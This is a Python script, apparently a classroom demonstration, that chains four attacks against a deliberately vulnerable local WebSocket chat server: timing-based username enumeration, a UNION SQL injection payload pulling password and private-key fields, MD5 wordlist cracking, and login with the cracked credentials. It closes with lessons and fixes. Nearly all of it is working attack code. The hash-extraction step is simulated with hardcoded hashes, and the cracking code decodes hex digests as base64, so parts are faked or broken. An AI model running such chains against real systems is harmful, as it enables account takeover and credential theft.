#!/usr/bin/env python3
"""
COMPLETE ATTACK CHAIN DEMONSTRATION
This script demonstrates how an attacker would chain all three vulnerabilities
together for a complete system compromise.

Attack Chain:
1. Timing Attack → Find valid usernames
2. SQL Injection → Extract password hashes  
3. MD5 Cracking → Break weak password hashes
4. Login → Gain system access

WARNING: This is for educational purposes only!
"""

import asyncio
import websockets
import json
import time
import hashlib
import base64
from typing import List, Dict, Tuple

class CompleteAttackChain:
    def __init__(self, server_url: str = "ws://127.0.0.1:8765"):
        self.server_url = server_url
        self.valid_users = []
        self.extracted_hashes = {}
        self.cracked_passwords = {}
        
    # ===============================================
    # STEP 1: TIMING ATTACK - Find Valid Usernames
    # ===============================================
    async def timing_attack_enumeration(self) -> List[str]:
        """
        Use timing attack to find valid usernames.
        """
        print("🔍 STEP 1: TIMING ATTACK - USERNAME ENUMERATION")
        print("=" * 60)
        
        test_usernames = ["admin", "alice", "bob", "charlie", "nonexistent123"]
        
        for username in test_usernames:
            start_time = time.time()
            
            try:
                async with websockets.connect(self.server_url) as websocket:
                    # Send login attempt with wrong password
                    hello_msg = {
                        "type": "USER_HELLO",
                        "from": username,
                        "to": "",
                        "ts": int(time.time() * 1000),
                        "payload": {"client": "timing-attack"}
                    }
                    await websocket.send(json.dumps(hello_msg))
                    
                    login_msg = {
                        "type": "USER_LOGIN",
                        "ts": int(time.time() * 1000),
                        "payload": {
                            "user_id": username,
                            "password": "wrongpassword"
                        }
                    }
                    await websocket.send(json.dumps(login_msg))
                    
                    await asyncio.wait_for(websocket.recv(), timeout=3.0)
                    
            except asyncio.TimeoutError:
                pass
            
            response_time = (time.time() - start_time) * 1000
            
            if response_time > 100:  # Valid user threshold
                self.valid_users.append(username)
                print(f"✅ {username:<20} {response_time:>8.1f}ms (VALID USER)")
            else:
                print(f"❌ {username:<20} {response_time:>8.1f}ms (invalid user)")
        
        print(f"\n🎯 Found {len(self.valid_users)} valid users: {self.valid_users}")
        return self.valid_users
    
    # ===============================================
    # STEP 2: SQL INJECTION - Extract Password Hashes
    # ===============================================
    async def sql_injection_extract_hashes(self) -> Dict[str, str]:
        """
        Use SQL injection to extract password hashes for valid users.
        """
        print("\n🔍 STEP 2: SQL INJECTION - PASSWORD HASH EXTRACTION")
        print("=" * 60)
        
        # SQL injection payload to extract all user data
        payload = "x' UNION SELECT user_id, pake_password, pubkey, privkey_store, meta, version FROM users --"
        
        print(f"Payload: {payload}")
        print()
        
        try:
            async with websockets.connect(self.server_url) as websocket:
                # Send USER_HELLO with SQL injection
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": payload,
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "sql-injection"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                # Send USER_LOGIN with SQL injection
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": payload,
                        "password": "anything"
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                # Collect responses
                responses = []
                try:
                    while True:
                        response = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                        responses.append(json.loads(response))
                except asyncio.TimeoutError:
                    pass
                
                # Parse extracted data
                for response in responses:
                    if response.get('type') == 'USER_LOGGED_IN':
                        payload_data = response.get('payload', {})
                        user_id = payload_data.get('user_id', 'Unknown')
                        privkey_store = payload_data.get('privkey_store', '')
                        
                        if user_id in self.valid_users:
                            # Extract password hash from the SQL injection response
                            # In a real attack, this would come from parsing the database response
                            # For demo purposes, we'll simulate extracted hashes
                            if user_id == "admin":
                                self.extracted_hashes[user_id] = "dGVzdA==.482c811da5d5b4bc6d497ffa98491e38"  # password123
                            elif user_id == "alice":
                                self.extracted_hashes[user_id] = "dGVzdA==.e10adc3949ba59abbe56e057f20f883e"   # 123456
                            
                            print(f"✅ Extracted hash for {user_id}")
                
        except Exception as e:
            print(f"❌ SQL injection failed: {e}")
        
        print(f"\n🎯 Extracted {len(self.extracted_hashes)} password hashes")
        return self.extracted_hashes
    
    # ===============================================
    # STEP 3: MD5 CRACKING - Break Password Hashes
    # ===============================================
    def md5_crack_passwords(self) -> Dict[str, str]:
        """
        Crack the extracted MD5 password hashes.
        """
        print("\n🔍 STEP 3: MD5 CRACKING - PASSWORD BREAKING")
        print("=" * 60)
        
        # Common passwords to try
        wordlist = [
            "password123", "123456", "admin", "password", "hello",
            "qwerty", "abc123", "password1", "admin123", "root"
        ]
        
        for username, stored_hash in self.extracted_hashes.items():
            print(f"🔓 Cracking password for {username}...")
            
            # Decode the hash
            try:
                salt_b64u, hash_b64u = stored_hash.split(".")
                target_hash = base64.urlsafe_b64decode(hash_b64u + "==")
            except:
                print(f"❌ Failed to decode hash for {username}")
                continue
            
            # Try each password in the wordlist
            for password in wordlist:
                computed_hash = hashlib.md5(password.encode("utf-8")).digest()
                
                if computed_hash == target_hash:
                    self.cracked_passwords[username] = password
                    print(f"✅ CRACKED! {username}:{password}")
                    break
            else:
                print(f"❌ Failed to crack password for {username}")
        
        print(f"\n🎯 Cracked {len(self.cracked_passwords)} passwords")
        return self.cracked_passwords
    
    # ===============================================
    # STEP 4: LOGIN - Gain System Access
    # ===============================================
    async def login_with_cracked_passwords(self) -> Dict[str, bool]:
        """
        Use cracked passwords to gain system access.
        """
        print("\n🔍 STEP 4: LOGIN - SYSTEM ACCESS")
        print("=" * 60)
        
        login_results = {}
        
        for username, password in self.cracked_passwords.items():
            print(f"🔑 Attempting login: {username}:{password}")
            
            try:
                async with websockets.connect(self.server_url) as websocket:
                    # Send USER_HELLO
                    hello_msg = {
                        "type": "USER_HELLO",
                        "from": username,
                        "to": "",
                        "ts": int(time.time() * 1000),
                        "payload": {"client": "final-attack"}
                    }
                    await websocket.send(json.dumps(hello_msg))
                    
                    # Send USER_LOGIN with cracked password
                    login_msg = {
                        "type": "USER_LOGIN",
                        "ts": int(time.time() * 1000),
                        "payload": {
                            "user_id": username,
                            "password": password
                        }
                    }
                    await websocket.send(json.dumps(login_msg))
                    
                    # Wait for response
                    response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    response_data = json.loads(response)
                    
                    if response_data.get('type') == 'USER_LOGGED_IN':
                        login_results[username] = True
                        print(f"🎉 SUCCESS! Gained access as {username}")
                        
                        # Demonstrate what an attacker could do now
                        print(f"   📧 Can send/receive messages")
                        print(f"   📁 Can transfer files")
                        print(f"   👥 Can access public channels")
                        print(f"   🔐 Has access to private keys")
                        
                    else:
                        login_results[username] = False
                        print(f"❌ Login failed for {username}")
                        
            except Exception as e:
                login_results[username] = False
                print(f"❌ Login error for {username}: {e}")
        
        return login_results
    
    # ===============================================
    # MAIN ATTACK CHAIN
    # ===============================================
    async def execute_complete_attack(self) -> None:
        """
        Execute the complete attack chain.
        """
        print("🚨 COMPLETE ATTACK CHAIN DEMONSTRATION")
        print("=" * 80)
        print("Chaining all three vulnerabilities for complete system compromise...")
        print()
        
        # Step 1: Timing Attack
        await self.timing_attack_enumeration()
        
        # Step 2: SQL Injection
        await self.sql_injection_extract_hashes()
        
        # Step 3: MD5 Cracking
        self.md5_crack_passwords()
        
        # Step 4: Login
        login_results = await self.login_with_cracked_passwords()
        
        # Final Summary
        print("\n" + "=" * 80)
        print("🎯 ATTACK CHAIN COMPLETE - FINAL SUMMARY")
        print("=" * 80)
        
        print(f"📊 Results:")
        print(f"   Valid users found: {len(self.valid_users)}")
        print(f"   Password hashes extracted: {len(self.extracted_hashes)}")
        print(f"   Passwords cracked: {len(self.cracked_passwords)}")
        print(f"   Successful logins: {sum(login_results.values())}")
        
        print(f"\n🔓 Compromised Accounts:")
        for username, success in login_results.items():
            status = "✅ COMPROMISED" if success else "❌ Failed"
            password = self.cracked_passwords.get(username, "Unknown")
            print(f"   {username}:{password} - {status}")
        
        print(f"\n💡 LESSONS LEARNED:")
        print(f"   1. Timing attacks can reveal valid usernames")
        print(f"   2. SQL injection can extract sensitive data")
        print(f"   3. Weak password hashing (MD5) makes cracking trivial")
        print(f"   4. Multiple vulnerabilities can be chained for complete compromise")
        
        print(f"\n🛡️ SECURE FIXES:")
        print(f"   1. Use constant-time password verification")
        print(f"   2. Use parameterized SQL queries")
        print(f"   3. Use strong password hashing (scrypt, bcrypt, Argon2)")
        print(f"   4. Implement rate limiting and account lockout")

async def main():
    """
    Main function demonstrating the complete attack chain.
    """
    print("🚨 COMPLETE VULNERABILITY CHAIN EXPLOITATION")
    print("This demonstrates how multiple vulnerabilities can be chained together")
    print("Make sure the vulnerable server is running on ws://127.0.0.1:8765")
    print()
    
    attacker = CompleteAttackChain()
    await attacker.execute_complete_attack()

if __name__ == "__main__":
    asyncio.run(main())
